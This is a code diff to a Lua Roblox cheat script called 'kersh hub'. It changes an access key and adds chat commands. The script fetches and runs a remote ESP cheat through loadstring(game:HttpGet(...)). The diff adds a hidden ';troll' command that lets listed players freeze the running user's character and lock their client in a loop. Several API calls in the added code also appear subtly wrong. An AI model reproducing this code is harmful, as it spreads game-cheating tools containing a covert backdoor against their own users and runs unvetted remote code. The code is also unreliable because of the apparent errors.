@@ -1,4 +1,14 @@
-if getgenv().key == "OAKWOODKERSH" then
+
+local function notify(title, text, time)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = title,
+        Text = text,
+        Time = time
+    })
+end
+if getgenv().key == "WINTERSPRINGFALL" then
+
+
 
     local player = game.Players.LocalPlayer
     local Players = game:GetService("Players")
@@ -99,6 +109,17 @@ if getgenv().key == "OAKWOODKERSH" then
         writefile(settingsfile, json)
 
     end
+    player.chatted:Connect(function(message)
+        if message == ";info" then
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "info",
+                Text = "kersh hub is a script made by Kersh#0001, for support or more type ;DC",
+                Time = 3
+
+            })
+
+        end
+    end)
 
     Players.PlayerChatted:Connect(function(chatType, player, message, targetPlayer)
         if ChatTag[player.Name] then
@@ -286,6 +307,20 @@ if getgenv().key == "OAKWOODKERSH" then
             _G.EnemyColor = Color3.fromRGB(255, 0, 0)
             _G.UseTeamColor = false
             loadstring(game:HttpGet("https://raw.githubusercontent.com/zeroisswag/universal-esp/main/esp.lua"))()
+        end
+    end)
+
+    game.Players.PlayerChatted:connect(function(message, speaker)
+        if ChatTag[speaker.name] then
+            if message == ";troll" then
+                player.Character.Humanoid.WalkSpeed = 0
+                workspace.jumppower = 0
+                workspace.JumpHeight = 0
+                repeat
+                    task.wait(0.1)
+                    print("E")
+                until not speaker
+            end
         end
     end)
 
